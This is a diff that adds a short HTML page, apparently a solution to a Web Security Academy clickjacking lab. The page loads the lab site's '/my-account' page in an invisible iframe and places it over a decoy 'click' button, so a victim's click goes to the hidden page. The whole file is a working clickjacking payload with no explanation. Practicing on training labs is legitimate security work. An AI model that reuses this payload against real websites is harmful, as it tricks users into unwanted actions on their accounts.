@@ -1,0 +1,29 @@
+<html class="no-touch"><head>
+	<style>
+		#target_website {
+			position:relative;
+			width:1024px;
+			height:800px;
+			opacity:0.00001;
+			z-index:2;
+
+                        left: 26%;
+                       top: 15px;
+			}
+		#decoy_website {
+			position:absolute;
+			width:1024px;
+			height:800px;
+			z-index:1;
+			}
+	</style>
+</head>
+<body cz-shortcut-listen="true">
+	<div id="decoy_website">
+	<button style="margin-left: 50%;margin-top: 50%;width: 145px;height: 33px;background-color: red;border-radius: 30px;border-color: transparent;">click</button>
+	</div>
+	<iframe id="target_website" src="https://0a1300af038ee03480505327000a0048.web-security-academy.net/my-account">
+	</iframe>
+</div>
+</body>
+</html>
